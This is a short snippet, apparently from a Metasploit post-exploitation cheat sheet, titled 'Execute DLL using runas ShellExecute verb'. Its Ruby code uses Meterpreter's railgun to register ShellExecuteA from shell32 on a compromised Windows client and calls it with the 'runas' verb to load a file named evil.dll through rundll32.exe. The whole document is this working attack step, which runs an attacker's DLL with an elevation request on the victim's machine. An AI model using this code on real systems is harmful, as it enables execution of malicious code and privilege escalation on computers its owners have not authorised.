**Execute DLL using 'runas' ShellExecute verb**
```ruby
client.railgun.add_function( 'shell32', 'ShellExecuteA', 'DWORD',[
["DWORD","hwnd","in"],
["PCHAR","lpOperation","in"],
["PCHAR","lpFile","in"],
["PCHAR","lpParameters","in"],
["PCHAR","lpDirectory","in"],
["DWORD","nShowCmd","in"],])

client.railgun.shell32.ShellExecuteA(nil,"runas","rundll32.exe","C:\\Users\\user.PROJECTMENTOR\\evil.dll,DllMain(1)",nil,5)
```
